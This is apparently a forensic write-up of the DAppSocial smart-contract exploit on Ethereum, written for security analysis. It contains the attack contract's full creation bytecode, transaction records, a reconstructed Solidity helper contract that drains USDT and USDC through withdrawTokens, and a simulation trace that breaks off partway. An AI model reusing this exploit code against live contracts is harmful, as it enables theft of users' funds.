% @KeyInfo - Total Lost : ~$16K
% Attacker : https://etherscan.io/address/0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26
% Attack Contract : https://etherscan.io/address/0xe897c0f9443785f8d4f0fa6e92a81066b3fbfee2
% Helper Attack Contract : https://etherscan.io/address/0xa8c6e7352b13815f6bfa87c7ffaaa6e3a7bfa849
% Vulnerable Contract : https://etherscan.io/address/0x319ec3ad98cf8b12a8be5719fec6e0a9bb1ad0d1
% Attack Tx : https://etherscan.io/tx/0xbd72bccec6dd824f8cac5d9a3a2364794c9272d7f7348d074b580e3c6e44312e

% @Analysis
% https://twitter.com/DecurityHQ/status/1698064511230464310

\section{Timeline}

\subsection{Setup}

\href{\urltxdappsocialsetupcreation}{Contract creation}:

\begin{lstlisting}[language=Json]
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "blockHash": "0x3637d499e94eea29452f7d24cc6af3e2ef359ebc297c5ccff2e5bf959483ebe9",
    "blockNumber": "0x11367ce",
    "hash": "0x1f6b9ccdf21dd0247d6acc4ae4eb370558ecb8b782fa51a76c5112f62b7dcda0",
    "chainId": "0x1",
    "from": "0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26",
    "gas": "0x180d7e",
    "gasPrice": "0x4a817c800",
    "input": "0x608060405260001960035534801561001657600080fd5b5060405162001b7f38038062001b7f8339810160408190526100379161006d565b600080546001600160a01b0319166001600160a01b03929092169190911790556100bb565b8051610067816100a4565b92915050565b60006020828403121561007f57600080fd5b600061008b848461005c565b949350505050565b60006001600160a01b038216610067565b6100ad81610093565b81146100b857600080fd5b50565b611ab480620000cb6000396000f3fe6080604052600436106100555760003560e01c80630aeb4ddf146100575780633df368bd14610077578063b0711e08146100a3578063b603cd80146100b9578063be6002c2146100ce578063df8de3e7146100fb575b005b34801561006357600080fd5b50610055610072366004610dc8565b61011b565b34801561008357600080fd5b5061008d60015481565b60405161009a9190611106565b60405180910390f35b3480156100af57600080fd5b5061008d60025481565b3480156100c557600080fd5b506100556107f0565b3480156100da57600080fd5b506100ee6100e9366004610de6565b61081f565b60405161009a919061108a565b34801561010757600080fd5b50610055610116366004610dc8565b6108b9565b6000546001600160a01b0316321461013257600080fd5b33321461013e57600080fd5b6101466109ed565b1561015057600080fd5b60405173dac17f958d2ee523a2206206994597c13d831ec79073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb489060009061018b90610d3b565b604051809103906000f0801580156101a7573d6000803e3d6000fd5b5090506101c16001600160a01b03841685621e8480610a7d565b6000846001600160a01b031684621e84806040516024016101e3929190611054565b60408051601f198184030181529181526020820180516001600160e01b03166366168bd760e01b179052516102189190610fcf565b6000604051808303816000865af19150503d8060008114610255576040519150601f19603f3d011682016040523d82523d6000602084013e61025a565b606091505b505090508061026857600080fd5b6040516342c5967760e01b81526001600160a01b038316906342c5967790610299908890889060019060040161102c565b600060405180830381600087803b1580156102b357600080fd5b505af11580156102c7573d6000803e3d6000fd5b505050506000856001600160a01b03168584620f42406040516024016102ef93929190611004565b60408051601f198184030181529181526020820180516001600160e01b031663bafac6bd60e01b179052516103249190610fcf565b6000604051808303816000865af19150503d8060008114610361576040519150601f19603f3d011682016040523d82523d6000602084013e610366565b606091505b505090508061037457600080fd5b6040516342c5967760e01b81526001600160a01b038416906342c59677906103a5908990899060029060040161102c565b600060405180830381600087803b1580156103bf57600080fd5b505af11580156103d3573d6000803e3d6000fd5b5050505050506103fa84621e8480846001600160a01b0316610a7d9092919063ffffffff16565b6000846001600160a01b031683621e848060405160240161041c929190611054565b60408051601f198184030181529181526020820180516001600160e01b03166366168bd760e01b179052516104519190610fcf565b6000604051808303816000865af19150503d806000811461048e576040519150601f19603f3d011682016040523d82523d6000602084013e610493565b606091505b50509050806104a157600080fd5b6040516342c5967760e01b81526001600160a01b038316906342c59677906104d2908890879060019060040161102c565b600060405180830381600087803b1580156104ec57600080fd5b505af1158015610500573d6000803e3d6000fd5b505050506000856001600160a01b03168484620f424060405160240161052893929190611004565b60408051601f198184030181529181526020820180516001600160e01b031663bafac6bd60e01b1790525161055d9190610fcf565b6000604051808303816000865af19150503d806000811461059a576040519150601f19603f3d011682016040523d82523d6000602084013e61059f565b606091505b50509050806105ad57600080fd5b6040516342c5967760e01b81526001600160a01b038416906342c59677906105de908990889060029060040161102c565b600060405180830381600087803b1580156105f857600080fd5b505af115801561060c573d6000803e3d6000fd5b50506000546040516370a0823160e01b81526106ab95506001600160a01b03918216945090881692506370a08231915061064a903090600401610fdb565b60206040518083038186803b15801561066257600080fd5b505afa158015610676573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061069a9190610e56565b6001600160a01b0386169190610b80565b6000546040516370a0823160e01b8152610744916001600160a01b0390811691908516906370a08231906106e3903090600401610fdb565b60206040518083038186803b1580156106fb57600080fd5b505afa15801561070f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107339190610e56565b6001600160a01b0385169190610b80565b806001600160a01b031663b603cd806040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561077f57600080fd5b505af1158015610793573d6000803e3d6000fd5b50505050306001600160a01b031663b603cd806040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156107d257600080fd5b505af11580156107e6573d6000803e3d6000fd5b5050505050505050565b6000546001600160a01b031633148061080857503330145b61081157600080fd5b6000546001600160a01b0316ff5b6000546060906001600160a01b031633148061083a57503330145b61084357600080fd5b600080846001600160a01b03168460405161085e9190610fcf565b6000604051808303816000865af19150503d806000811461089b576040519150601f19603f3d011682016040523d82523d6000602084013e6108a0565b606091505b5091509150816108af57600080fd5b9150505b92915050565b6000546001600160a01b03163314806108d157503330145b6108da57600080fd5b6040516370a0823160e01b81526000906001600160a01b038316906370a0823190610909903090600401610fdb565b60206040518083038186803b15801561092157600080fd5b505afa158015610935573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109599190610e56565b905080156109e95760005460405163a9059cbb60e01b81526001600160a01b038481169263a9059cbb926109959290911690859060040161106f565b602060405180830381600087803b1580156109af57600080fd5b505af11580156109c3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109e79190610e38565b505b5050565b60007308e80ecb146dc0b835cf3d6c48da97556998f599321415610a115750600190565b73919393b8eacb9e1f23bcd2f18b7de428687b1cd2321415610a335750600190565b73190b248f32cee228500fb72e87ab65fa98f258b5321415610a555750600190565b73c0ffeebabe5d496b2dde509f9fa189c25cf29671321415610a775750600190565b50600090565b801580610b055750604051636eb1769f60e11b81526001600160a01b0384169063dd62ed3e90610ab39030908690600401610fe9565b60206040518083038186803b158015610acb57600080fd5b505afa158015610adf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b039190610e56565b155b610b2a5760405162461bcd60e51b8152600401610b21906110f6565b60405180910390fd5b6109e78363095ea7b360e01b8484604051602401610b4992919061106f565b60408051601f198184030181529190526020810180516001600160e01b03166001600160e01b031990931692909217909152610b9f565b6109e78363a9059cbb60e01b8484604051602401610b4992919061106f565b6000610bf4826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b0316610c2e9092919063ffffffff16565b8051909150156109e75780806020019051810190610c129190610e38565b6109e75760405162461bcd60e51b8152600401610b21906110e6565b6060610c3d8484600085610c47565b90505b9392505050565b606082471015610c695760405162461bcd60e51b8152600401610b219061109b565b843b610c875760405162461bcd60e51b8152600401610b21906110ab565b600080866001600160a01b03168587604051610ca39190610fcf565b60006040518083038185875af1925050503d8060008114610ce0576040519150601f19603f3d011682016040523d82523d6000602084013e610ce5565b606091505b5091509150610cf5828286610d02565b925050505b949350505050565b60608315610d11575081610c40565b825115610d215782518084602001fd5b8160405162461bcd60e51b8152600401610b21919061108a565b6108598061122683390190565b6000610d5b610d5684611130565b611114565b905082815260208101848484011115610d7357600080fd5b610d7e848285611181565b509392505050565b80356108b381611200565b80516108b381611217565b600082601f830112610dad57600080fd5b8135610cfa848260208601610d48565b80516108b38161121f565b600060208284031215610dda57600080fd5b6000610cfa8484610d86565b60008060408385031215610df957600080fd5b6000610e058585610d86565b925050602083013567ffffffffffffffff811115610e2257600080fd5b610e2e85828601610d9c565b9150509250929050565b600060208284031215610e4a57600080fd5b6000610cfa8484610d91565b600060208284031215610e6857600080fd5b6000610cfa8484610dbd565b610e7d8161115b565b82525050565b6000610e8d825190565b808452602084019350610ea481856020860161118d565b601f01601f19169290920192915050565b6000610ebf825190565b610ecd81856020860161118d565b9290920192915050565b610e7d8161116c565b610e7d81611179565b602681526000602082017f416464726573733a20696e73756666696369656e742062616c616e636520666f8152651c8818d85b1b60d21b602082015291505b5060400190565b602a81526000602082017f5361666545524332303a204552433230206f7065726174696f6e20646964206e8152691bdd081cdd58d8d9595960b21b60208201529150610f28565b603681526000602082017f5361666545524332303a20617070726f76652066726f6d206e6f6e2d7a65726f81527520746f206e6f6e2d7a65726f20616c6c6f77616e636560501b60208201529150610f28565b80610e7d565b6000610c408284610eb5565b602081016108b38284610e74565b60408101610ff78285610e74565b610c406020830184610e74565b606081016110128286610e74565b61101f6020830185610e74565b610cfa6040830184610ed7565b6060810161103a8286610e74565b6110476020830185610e74565b610cfa6040830184610ee0565b604081016110628285610e74565b610c406020830184610ed7565b6040810161107d8285610e74565b610c406020830184610fc9565b60208082528101610c408184610e83565b602080825281016108b381610ee9565b602080825281016108b381601d81527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000602082015260400190565b602080825281016108b381610f2f565b602080825281016108b381610f76565b602081016108b38284610fc9565b600061111f60405190565b905061112b82826111bd565b919050565b600067ffffffffffffffff82111561114a5761114a6111ea565b601f19601f83011660200192915050565b60006001600160a01b0382166108b3565b600062ffffff82166108b3565b6000816108b3565b82818337506000910152565b60005b838110156111a8578181015183820152602001611190565b838111156111b7576000848401525b50505050565b601f19601f830116810181811067ffffffffffffffff821117156111e3576111e36111ea565b6040525050565b634e487b7160e01b600052604160045260246000fd5b6112098161115b565b811461121457600080fd5b50565b801515611209565b8061120956fe608060405234801561001057600080fd5b50600080546001600160a01b03191633179055610827806100326000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806342c596771461003b578063b603cd8014610050575b600080fd5b61004e610049366004610538565b610058565b005b61004e6102ed565b6000546001600160a01b0316331461006f57600080fd5b806001141561012757600080546040516001600160a01b038087169261009c9291169084906024016106e2565b60408051601f198184030181529181526020820180516001600160e01b0316631979845760e21b179052516100d191906106c8565b6000604051808303816000865af19150503d806000811461010e576040519150601f19603f3d011682016040523d82523d6000602084013e610113565b606091505b505090508061012157600080fd5b50505050565b80600214156102e8576000836001600160a01b031683846001600160a01b03166370a08231876040518263ffffffff1660e01b815260040161016991906106d4565b60206040518083038186803b15801561018157600080fd5b505afa158015610195573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101b991906105ab565b6040516024016101ca9291906106fd565b60408051601f198184030181529181526020820180516001600160e01b03166306b091f960e01b179052516101ff91906106c8565b6000604051808303816000865af19150503d806000811461023c576040519150601f19603f3d011682016040523d82523d6000602084013e610241565b606091505b505090508061024f57600080fd5b6000546040516370a0823160e01b8152610121916001600160a01b0390811691908616906370a08231906102879030906004016106d4565b60206040518083038186803b15801561029f57600080fd5b505afa1580156102b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d791906105ab565b6001600160a01b0386169190610312565b505050565b6000546001600160a01b0316331461030457600080fd5b6000546001600160a01b0316ff5b6102e88363a9059cbb60e01b84846040516024016103319291906106fd565b60408051601f198184030181529190526020810180516001600160e01b03166001600160e01b03199093169290921790915260006103b8826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b03166103fb9092919063ffffffff16565b8051909150156102e857808060200190518101906103d69190610585565b6102e85760405162461bcd60e51b81526004016103f290610774565b60405180910390fd5b606061040a8484600085610414565b90505b9392505050565b6060824710156104365760405162461bcd60e51b81526004016103f290610729565b843b6104545760405162461bcd60e51b81526004016103f290610739565b600080866001600160a01b0316858760405161047091906106c8565b60006040518083038185875af1925050503d80600081146104ad576040519150601f19603f3d011682016040523d82523d6000602084013e6104b2565b606091505b50915091506104c28282866104cd565b979650505050505050565b606083156104dc57508161040d565b8251156104ec5782518084602001fd5b8160405162461bcd60e51b81526004016103f29190610718565b8035610511816107cc565b92915050565b8051610511816107e3565b8035610511816107eb565b8051610511816107eb565b60008060006060848603121561054d57600080fd5b60006105598686610506565b935050602061056a86828701610506565b925050604061057b86828701610522565b9150509250925092565b60006020828403121561059757600080fd5b60006105a38484610517565b949350505050565b6000602082840312156105bd57600080fd5b60006105a3848461052d565b6105d281610784565b82525050565b60006105e2825190565b6105f08185602086016107a0565b9290920192915050565b6105d281610795565b600061060d825190565b8084526020840193506106248185602086016107a0565b601f01601f19169290920192915050565b602681526000602082017f416464726573733a20696e73756666696369656e742062616c616e636520666f8152651c8818d85b1b60d21b602082015291505b5060400190565b602a81526000602082017f5361666545524332303a204552433230206f7065726174696f6e20646964206e8152691bdd081cdd58d8d9595960b21b60208201529150610674565b806105d2565b600061040d82846105d8565b6020810161051182846105c9565b604081016106f082856105c9565b61040d60208301846105fa565b6040810161070b82856105c9565b61040d60208301846106c2565b6020808252810161040d8184610603565b6020808252810161051181610635565b6020808252810161051181601d81527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000602082015260400190565b602080825281016105118161067b565b60006001600160a01b038216610511565b600060ff8216610511565b60005b838110156107bb5781810151838201526020016107a3565b838111156101215750506000910152565b6107d581610784565b81146107e057600080fd5b50565b8015156107d5565b806107d556fea2646970667358221220176a1158bf3ea1847b9d58b95d785ff837dc1c2e1941c44fc08a6375b1f8050a64736f6c63430008040033a2646970667358221220877fc7dd05b4eb4af1c2ccb762a2a1b3a2af09e079d6a25ca36130b4e68551a264736f6c634300080400330000000000000000000000007d9bc45a9abda926a7ce63f78759dbfa9ed72e26",
    "nonce": "0x16",
    "r": "0x5229de04cffbaf77311656ac5c8e98981090b84ff2949caec623d3b67d3b9e5b",
    "s": "0x1adb5bea08ff93f05b117df917b372a39a12bd15ba4e4f373cdcd36338dc2a5d",
    "to": null,
    "transactionIndex": "0xe",
    "type": "0x0",
    "v": "0x25",
    "value": "0x0"
  }
}
\end{lstlisting}

\subsection{Funding}

\href{\urltxdappsocialsetupusdt}{USDT funding}:

\begin{lstlisting}[language=Json]
{
    "blockHash": "0xfff25d13f3e37982e6a380771a52ea79d60d4592fb13f24a157a96bd48cb823a",
    "blockNumber": "0x011367d1",
    "from": "0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26",
    "gas": "0x01724b",
    "gasPrice": "0x030305bec8",
    "maxFeePerGas": "0x03f6b8baa1",
    "maxPriorityFeePerGas": "0x05f5e100",
    "hash": "0xe0a98402cb9b9536b4b308458ba46f23d41a51dfd6ee4102c118230a44529cbd",
    "input": "0xa9059cbb000000000000000000000000e897c0f9443785f8d4f0fa6e92a81066b3fbfee200000000000000000000000000000000000000000000000000000000004c4b40",
    "nonce": "0x17",
    "to": "0xdac17f958d2ee523a2206206994597c13d831ec7",
    "transactionIndex": "0xd5",
    "value": "0x00",
    "type": "0x02",
    "accessList": "0x",
    "chainId": "0x01",
    "v": "0x01",
    "r": "0x66ffefa83e6ce55d11ee5d9eb5e0534b9b8579d2e354f8ea72d8f91250fc5893",
    "s": "0x328dc78a37989de1c52bd4b5f24c1a7f9796981e6eb8ac520a5945b06888fef4",
    "yParity": "0x01"
}
\end{lstlisting}

\href{\urltxdappsocialsetupusdc}{USDC funding}:

\begin{lstlisting}[language=Json]
{
    "blockHash": "0xfd0ebdeb9cb2d4dab0972615e200930abbcb09b1a599c38f4162f0592627bc42",
    "blockNumber": "0x011367d4",
    "from": "0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26",
    "gas": "0x01839a",
    "gasPrice": "0x02e9129729",
    "maxFeePerGas": "0x042ad5a327",
    "maxPriorityFeePerGas": "0x05f5e100",
    "hash": "0x9004e609f3b383b1ea6716064831359a8e47baff271f7bc3692fc8e1ca116007",
    "input": "0xa9059cbb000000000000000000000000e897c0f9443785f8d4f0fa6e92a81066b3fbfee200000000000000000000000000000000000000000000000000000000004c4b40",
    "nonce": "0x18",
    "to": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
    "transactionIndex": "0x6a",
    "value": "0x00",
    "type": "0x02",
    "accessList": "0x",
    "chainId": "0x01",
    "v": "0x00",
    "r": "0x7105aeff27b039df5b263d6abe37668ec576f5187b0547c9b1d3c7916049c265",
    "s": "0x2e3ad90866df9c769cb87885746cdb62db1e3b9778a5bef33a37abba1ac9abcb",
    "yParity": "0x00"
}
\end{lstlisting}

\subsection{Exploit}

The exploit is \href{\urltxdappsocialexploit}{called with the address of DAppSocial}:

\begin{lstlisting}[language=Json]
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "blockHash": "0x044b732e86abe2b520e03a6859e4df5efcaf7d095cf8ed32b80e1cc89115a65c",
    "blockNumber": "0x11367d7",
    "from": "0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26",
    "gas": "0xe329a",
    "gasPrice": "0x4a817c800",
    "hash": "0xbd72bccec6dd824f8cac5d9a3a2364794c9272d7f7348d074b580e3c6e44312e",
    "input": "0x0aeb4ddf000000000000000000000000319ec3ad98cf8b12a8be5719fec6e0a9bb1ad0d1",
    "nonce": "0x19",
    "to": "0xe897c0f9443785f8d4f0fa6e92a81066b3fbfee2",
    "transactionIndex": "0xa",
    "value": "0x0",
    "type": "0x0",
    "chainId": "0x1",
    "v": "0x26",
    "r": "0xc5e9af61167899d363aa41bb15cf175796cd7edabb170e9acbdf67bfb645484c",
    "s": "0x36aad59e830a5d928edf84de6ad428be549e500f0ea2c5f165c45f2a62cc424c"
  }
}
\end{lstlisting}

inputs: DappSocial address is not in the runtime nor creation bytecode of any contract (attack / helper)

\section{Simulation}

\subsection{Known}

Contract creator:

Creation bytecode:

Runtime bytecode:

Inner contract:

\begin{lstlisting}[language=Solidity]
contract HelperExploitContract {
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
    address payable private immutable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    // 0x42c59677 exploit function
    function exploit(address token, bool withdraw) external {
        require(msg.sender == owner, "Only owner");
        if (withdraw == true) {
            if (token == address(USDT)) {
                DAppSocial.withdrawTokens(address(token), USDT.balanceOf(address(DAppSocial)));
                USDT.transfer(owner, USDT.balanceOf(address(this)));
            } else {
                DAppSocial.withdrawTokens(address(token), USDC.balanceOf(address(DAppSocial)));
                USDC.transfer(owner, USDC.balanceOf(address(this)));
            }
        } else {
            DAppSocial.lockTokens(owner, 0);
        }
    }

    function killMe() external {
        require(msg.sender == owner, "Only owner");
        selfdestruct(owner);
    }
}
\end{lstlisting}

\subsection{Guessing}

\subsubsection{Fuzzing Patterns}

\begin{lstlisting}[language=Python]
['0x000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3', '0x000000000000000000000000aab4aab5aab6aab7aab8aab9aabaaabbaabcaabd', '0x000000000000000000000000aabeaabfaac0aac1aac2aac3aac4aac5aac6aac7', '0x000000000000000000000000aac8aac9aacaaacbaaccaacdaaceaacfaad0aad1', '0x000000000000000000000000aad2aad3aad4aad5aad6aad7aad8aad9aadaaadb', '0x000000000000000000000000aadcaaddaadeaadfaae0aae1aae2aae3aae4aae5', '0x000000000000000000000000aae6aae7aae8aae9aaeaaaebaaecaaedaaeeaaef', '0x000000000000000000000000aaf0aaf1aaf2aaf3aaf4aaf5aaf6aaf7aaf8aaf9', '0x000000000000000000000000aafaaafbaafcaafdaafeaaffab00ab01ab02ab03', '0x000000000000000000000000ab04ab05ab06ab07ab08ab09ab0aab0bab0cab0d', '0x000000000000000000000000ab0eab0fab10ab11ab12ab13ab14ab15ab16ab17', '0x000000000000000000000000ab18ab19ab1aab1bab1cab1dab1eab1fab20ab21', '0x000000000000000000000000ab22ab23ab24ab25ab26ab27ab28ab29ab2aab2b', '0x000000000000000000000000ab2cab2dab2eab2fab30ab31ab32ab33ab34ab35', '0x000000000000000000000000ab36ab37ab38ab39ab3aab3bab3cab3dab3eab3f', '0x000000000000000000000000ab40ab41ab42ab43ab44ab45ab46ab47ab48ab49']
['0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59', '0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69', '0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79', '0xab7aab7bab7cab7dab7eab7fab80ab81ab82ab83ab84ab85ab86ab87ab88ab89', '0xab8aab8bab8cab8dab8eab8fab90ab91ab92ab93ab94ab95ab96ab97ab98ab99', '0xab9aab9bab9cab9dab9eab9faba0aba1aba2aba3aba4aba5aba6aba7aba8aba9', '0xabaaabababacabadabaeabafabb0abb1abb2abb3abb4abb5abb6abb7abb8abb9', '0xabbaabbbabbcabbdabbeabbfabc0abc1abc2abc3abc4abc5abc6abc7abc8abc9', '0xabcaabcbabccabcdabceabcfabd0abd1abd2abd3abd4abd5abd6abd7abd8abd9', '0xabdaabdbabdcabddabdeabdfabe0abe1abe2abe3abe4abe5abe6abe7abe8abe9', '0xabeaabebabecabedabeeabefabf0abf1abf2abf3abf4abf5abf6abf7abf8abf9', '0xabfaabfbabfcabfdabfeabffac00ac01ac02ac03ac04ac05ac06ac07ac08ac09', '0xac0aac0bac0cac0dac0eac0fac10ac11ac12ac13ac14ac15ac16ac17ac18ac19', '0xac1aac1bac1cac1dac1eac1fac20ac21ac22ac23ac24ac25ac26ac27ac28ac29', '0xac2aac2bac2cac2dac2eac2fac30ac31ac32ac33ac34ac35ac36ac37ac38ac39', '0xac3aac3bac3cac3dac3eac3fac40ac41ac42ac43ac44ac45ac46ac47ac48ac49']
\end{lstlisting}

\subsubsection{The Selector(s ?)}

Bypass the obfuscation.

\begin{lstlisting}[language=Python]
ipb.get_function_selectors(__b, raw=True)
('3df368bd', 'b603cd80', '42c59677', 'b0711e08', 'df8de3e7', 'be6002c2', '0aeb4ddf')
\end{lstlisting}

\subsubsection{The Inputs => The Signature}

0xaaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3aab4aab5aab6aab7aab8aab9, 0xaabaaabbaabcaabdaabeaabfaac0aac1aac2aac3aac4aac5aac6aac7aac8aac9, 0xaacaaacbaaccaacdaaceaacfaad0aad1aad2aad3aad4aad5aad6aad7aad8aad9, 0xaadaaadbaadcaaddaadeaadfaae0aae1aae2aae3aae4aae5aae6aae7aae8aae9
=> fail
=> input 1 is an address

0x000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3, 0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59, 0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69, 0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79
=> find first argument in the traces (test with last syllable)
=> notice the call with only 1 argument at the root
=> other arguments not found

[659911] DAppTest::testExploit()
    ├─ [0] VM::startPrank(0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26, 0x7d9bC45a9ABDA926A7Ce63f78759dBFA9Ed72e26)
    │   └─ ← ()
    ├─ [653127] 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2::exploit(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3)
    │   ├─ [439990] → new <unknown>@0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849
    │   │   └─ ← 2087 bytes of code
    │   ├─ [5356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [staticcall]
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [22953] 0xdAC17F958D2ee523a2206206994597C13D831ec7::approve(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3, 2000000 [2e6])
    │   │   ├─ emit Approval(owner: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, spender: 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3, amount: 2000000 [2e6])
    │   │   └─ ← ()
    │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::depositTokens(0xdAC17F958D2ee523a2206206994597C13D831ec7, 2000000 [2e6])
    │   │   └─ ← ()
    │   ├─ [2045] 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849::42c59677(000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::lockTokens(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0)
    │   │   │   └─ ← ()
    │   │   └─ ← ()
    │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::withdrawTokensWithAlt(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849, 1000000 [1e6])
    │   │   └─ ← ()
    │   ├─ [26023] 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849::42c59677(000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000002)
    │   │   ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [staticcall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::withdrawTokens(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0)
    │   │   │   └─ ← ()
    │   │   ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849) [staticcall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [14835] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0)
    │   │   │   ├─ emit Transfer(from: 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849, to: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, amount: 0)
    │   │   │   └─ ← ()
    │   │   └─ ← ()
    │   ├─ [9926] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [staticcall]
    │   │   ├─ [2637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3) [delegatecall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [29767] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3, 2000000 [2e6])
    │   │   ├─ [28978] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3, 2000000 [2e6]) [delegatecall]
    │   │   │   ├─ emit Approval(owner: 0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, spender: 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3, amount: 2000000 [2e6])
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::depositTokens(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 2000000 [2e6])
    │   │   └─ ← ()
    │   ├─ [2045] 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849::42c59677(000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::lockTokens(0xE897C0f9443785F8D4F0FA6e92a81066b3fbFEe2, 0)
    │   │   │   └─ ← ()
    │   │   └─ ← ()
    │   ├─ [0] 0xaAaAAaabAAAcAAaDAAAEAaafAAB0AAb1Aab2aAb3::withdrawTokensWithAlt(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xA8c6E7352b13815f6bFA87c7FFaaA6e3a7BfA849, 1000000 [1e6])
    │   │   └─ ← ()
